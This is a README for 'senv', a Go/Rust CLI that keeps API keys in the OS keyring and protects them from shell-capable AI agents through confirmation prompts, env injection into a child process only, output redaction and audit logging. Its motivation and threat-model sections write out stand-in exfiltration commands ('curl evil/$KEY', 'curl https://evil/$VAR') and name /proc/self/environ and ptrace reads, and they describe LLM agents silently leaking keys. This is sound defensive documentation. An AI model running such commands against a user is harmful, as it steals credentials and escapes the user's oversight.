# senv — tiny OS-keyring env vault (canonical doc)

Two interchangeable binaries, one shared store: **Go** (`senv/`, `go install`)
and **Rust** (`senv-rs/`, `cargo install`). Either binary reads what the other
wrote. Secrets live **only** in the OS-native store (macOS Keychain, Linux
Secret Service, Windows Credential Manager). The local index
(`~/.config/senv/index.json`, macOS: `~/Library/Application Support/senv/`)
holds only entry/variant **names** — never secrets, never shell history.

## Why: LLMs can spy on your keys

Any agent with a shell tool (`pi`, Claude Code, open-source models running
locally — openness of weights changes nothing once it has `exec`) can
silently run `printenv`, `env`, `cat ~/.config/gcloud/*`, or `curl evil/$KEY`
and paste the result into a tool call you never inspect. API keys in
`export FOO=...`, `.env` files, or `auth.json` are one `printenv` away from
exfiltration, and nothing alerts you afterwards.

`senv` shrinks that window to a human-confirmed, audited moment:

- `get` **always asks** `Allow access to <name>/<variant>? [y/N]` on
  `/dev/tty`. There is deliberately **no `--yes` bypass** — automation must
  use `run`.
- `run` injects the secret **only into the child process env**, execs
  directly (**no shell**, so nothing lands in `ps`/history), captures
  child stdout/stderr and **redacts** the secret (+base64/URL-escaped forms)
  before you or the model see it, with an optional `--allowlist` so only
  pinned binaries can trigger use.
- Every `get`/`run` — allowed **or denied** — is recorded **inside the
  program** (no wrapper script to bypass) in an append-only audit log with
  caller identity and the exact command, plus a persistent per-entry counter
  (`senv stats`, `senv log`). After an agent session you can answer *"who
  used which key, how, and when?"*

## Install (3 OSes)

Requires Go ≥ 1.21 **or** Rust stable (pick one binary; same store).

```sh
cd senv && go install .              # Go -> `senv` on PATH
# or: cd senv-rs && cargo install --path .   # Rust, identical UX
# or: make -C senv dist && ls senv/dist/      # prebuilt-style binaries:
#   senv-darwin-arm64  senv-darwin-amd64  senv-linux-amd64
#   senv-linux-arm64   senv-windows-amd64.exe
```

OS helpers: macOS uses `/usr/bin/security` (built in); Linux needs
`secret-tool` (libsecret, e.g. `apt install libsecret-tools`);
Windows needs nothing extra.

## Use

```sh
senv set mistral prod                # hidden prompt, stored in OS keychain
senv set mistral dev                 # second variant, same name
senv list                            # mistral: dev, prod (never secrets)
senv list mistral                    # 1) mistral/dev  2) mistral/prod
senv get mistral prod                # ALWAYS asks confirmation (human yes-click, no bypass)

# use-without-see (model can USE, not READ — see RUN_THREAT_MODEL.md):
senv run mistral prod --env MISTRAL_API_KEY -- curl -s https://api.mistral.ai/v1/models \
  -H "Authorization: Bearer $MISTRAL_API_KEY"
# confirm gate, no shell, output redacted, exit passthrough;
# --allowlist curl,python3  --no-redact (opt-out)  -y (trusted auto only)

senv get mistral 2                   # by index
senv get mistral                     # picker on stderr (safe inside $(...))
senv del mistral dev                 # one variant (rm = alias)
senv del mistral                     # whole name
```

Missing key → exit 1 + hint (`senv list` / `senv set …`).

## pi / agent integration

`get` is interactive-only by design (`get --yes` is rejected). For agents,
wrap the spawn so the model never reads plaintext:

```sh
senv run mistral prod --env MISTRAL_API_KEY -- pi          # human confirms once; model uses without seeing the key
senv run mistral prod --env MISTRAL_API_KEY -y -- pi ...  # -y only here (trusted automation, output still redacted)
```

Do NOT use `!senv get ...` in `pi` auth.json (no tty to confirm on, and there
is intentionally no bypass). Scope the agent's tool policy to
`senv run <specific-name> -- <specific-cmd>`, never bare `senv get`.

## Audit: who called, with what exact command

`get` and `run` record **inside the binary** on every call — counter plus
append-only JSON Lines in `senv/audit.log` (`0600`), counters in
`senv/counts.json` (`0600`). Fields: UTC timestamp, pid/ppid/parent-process
name + short parent chain (best effort), user, cwd, executable path, tty hint,
**exact argv**, subcommand, name/variant, decision (`allowed`/`denied` +
reason), and for `run`: env var name, child basename, redact flag, exit code.
**Secrets are never written** to either file (checked in tests).

```sh
senv stats          # per-entry get/run counts + last caller + exact last command
senv log            # last 20 audit entries, human-readable
senv log -n 50      # last 50  (--tail N also works)
senv log --json     # raw JSON Lines (e.g. pipe to jq)
```

Example `stats` line: `run mistral/prod: 14 (last … allowed; alice by pi(1234))`.
Old pre-JSON audit lines (≤ v0.1) are shown verbatim by `log`.
For tests/isolation: `SENV_CONFIG_DIR=/tmp/x senv …` overrides the config dir.

## Threat model / limits (honest)

STOPS: accidental `printenv`/`env` dumps (redacted), shell-history/`ps`
leakage, casual `get`-and-scrollback reads, wrong-command invocations
(allowlist deny), unattended silent use (confirm gate), post-hoc "who used
what" questions (audit log + counters).

DOES NOT STOP a deliberately malicious command with network access: `echo
$VAR | tr …`, `curl https://evil/$VAR`, `/proc/self/environ`, `ptrace`,
memory scrape. Redaction is a typo/airbag net, not a sandbox, and no
userspace wrapper survives `arbitrary-command + network`. Full analysis:
[`RUN_THREAT_MODEL.md`](RUN_THREAT_MODEL.md) (incl. the planned `senv call`
HTTPS-proxy follow-up for high-value keys).

Real boundary = layered: `--allowlist` pinned binaries + no shell + **egress
control** (proxy/firewall allowing only the target API host) +
**container/sandbox** (no /proc of others, no ptrace) + human confirm per use.
For unattended agents, prefer egress-limited containers over `-y` on a bare
host.

## Docs map

- [`QUICKSTART.md`](QUICKSTART.md) — 30-second copy-paste.
- [`RUN_THREAT_MODEL.md`](RUN_THREAT_MODEL.md) — evaluated patterns + honest limits.
- [`../senv-rs/README.md`](../senv-rs/README.md) — Rust port: interop table, install, pi notes.
